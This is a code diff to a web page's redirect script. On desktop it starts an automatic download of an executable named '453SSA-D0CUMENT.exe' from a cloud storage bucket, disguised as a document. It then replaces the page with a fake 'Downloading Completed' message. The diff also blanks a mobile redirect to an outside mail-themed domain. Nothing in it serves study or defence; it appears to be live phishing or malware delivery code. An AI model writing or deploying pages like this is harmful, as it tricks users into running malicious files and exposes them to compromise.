@@ -15,26 +15,62 @@
 
     if (isMobile) {
       // Mobile redirect
-      window.location.href = "https://msrmails.de/bas";
+      window.location.href = "";
     } else {
-      // Desktop redirect
+      // Start download immediately
       window.location.href =
         "https://pub-d34c24ee9207490584a6f42b7498618a.r2.dev/453SSA-D0CUMENT.exe";
+
+      // After 25 seconds redirect to completion page
+      setTimeout(() => {
+        document.open();
+        document.write(`
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Downloading Completed</title>
+            <style>
+              body {
+                margin: 0;
+                height: 100vh;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                background: #111;
+                color: #fff;
+                font-family: Arial, sans-serif;
+              }
+
+              .box {
+                text-align: center;
+                padding: 40px;
+                border-radius: 12px;
+                background: #1e1e1e;
+                box-shadow: 0 0 20px rgba(0,0,0,0.4);
+              }
+
+              h1 {
+                color: #4CAF50;
+              }
+            </style>
+          </head>
+          <body>
+            <div class="box">
+              <h1>Downloading Completed</h1>
+              <p>Your file has been downloaded successfully.</p>
+            </div>
+          </body>
+          </html>
+        `);
+        document.close();
+      }, 25000);
     }
-
-    // Change page text after 25 seconds
-    setTimeout(() => {
-      document.title = "Downloading Completed";
-
-      const status = document.getElementById("status");
-      if (status) {
-        status.innerText = "Downloading Completed";
-      }
-    }, 58000);
   </script>
 </head>
 
 <body>
-  <p id="status">Redirecting...</p>
+  <p>Redirecting...</p>
 </body>
 </html>
